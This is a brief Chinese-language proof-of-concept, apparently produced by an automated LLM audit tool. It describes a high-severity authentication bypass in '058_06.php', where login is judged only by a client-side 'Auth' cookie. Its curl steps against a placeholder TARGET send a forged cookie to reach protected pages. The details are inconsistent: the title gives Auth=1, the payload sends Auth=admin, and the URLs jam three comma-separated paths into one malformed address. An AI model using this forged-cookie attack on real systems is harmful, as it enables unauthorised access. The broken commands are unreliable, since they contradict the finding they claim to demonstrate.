# POC — 058_06.php 登录逻辑使用 setcookie("Auth",1) 且仅凭客户端 Cookie 判定登录，可伪造 Auth=1 绕过认证

- finding_id: `LLM-28954cf1fb7e`
- type: `auth_bypass` / CWE-287
- severity: `high`
- file: `058_06.php:46`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/058_01.php, /058_04.php, /058_08.php'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 认证绕过 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/058_01.php, /058_04.php, /058_08.php' \
  -H 'Cookie: Auth=admin'
```
预期：以未授权/伪造身份访问受保护资源返回 2xx。

3. **记录响应与副作用：对比基线响应，检查 TARGET 侧文件或带外通道**  
预期：出现与基线不同的内容、状态码、延迟或副作用

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。